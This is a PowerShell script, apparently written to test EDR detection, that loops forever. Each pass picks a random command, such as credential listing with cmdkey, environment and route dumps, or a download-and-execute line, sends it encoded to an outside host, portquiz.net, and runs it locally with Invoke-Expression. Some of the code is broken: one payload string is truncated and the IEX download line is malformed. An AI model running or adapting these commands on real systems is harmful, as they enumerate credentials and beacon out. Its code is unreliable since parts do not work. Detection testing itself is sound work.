#Test your EDR to see if its going to see anything
# dchow[AT]xtecsystems.com
$payloads = @(
    "cmd.exe /c whoami",
    "cmd.exe /c cmdkey /list",
    "cmd.exe /c route print",
    "cmd.exe /c gpresult -R",
    "cmd.exe /c set",
    "powershell.exe -Command IEX(New-Object System.Net.WebClient).DownloadFile(""http://portquiz.net/index.html"", ""C:\Users\Public\Downloads\pen_test_benign.exe"")",
    "powershell.exe -Command `$path = 'C:\Users\Public\Downloads\pen_test_benign.exe'; `$proc = Start-Process -FilePath powershell.exe -ArgumentList ""-nop -WindowStyle Hidden -Command"""
)

while ($true) {
    $payload = Get-Random -InputObject $payloads
    $encodedPayload = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload))

    Write-Host "Sending payload: $payload"

    $result = Test-NetConnection -ComputerName portquiz.net -Port 443 -InformationLevel Quiet
    if ($result -eq $true) {
        Write-Host "Connection successful. Sending encoded payload:"
        Write-Host $encodedPayload

        $socket = New-Object System.Net.Sockets.TcpClient("portquiz.net", 443)
        $stream = $socket.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.Write($encodedPayload)
        $writer.Flush()
        $writer.Close()
        $stream.Close()
        $socket.Close()

        Write-Host "Payload sent successfully."
    }
    else {
        Write-Host "Connection failed. Skipping payload send."
    }

    #Added to ensure local triggers of LOLbins
    Write-Host "Executing: $payload"
    Invoke-Expression $payload

    $sleepTime = Get-Random -Minimum 60 -Maximum 600
    Write-Host "Sleeping for $sleepTime seconds..."
    Start-Sleep -Seconds $sleepTime
    Write-Host ""
}
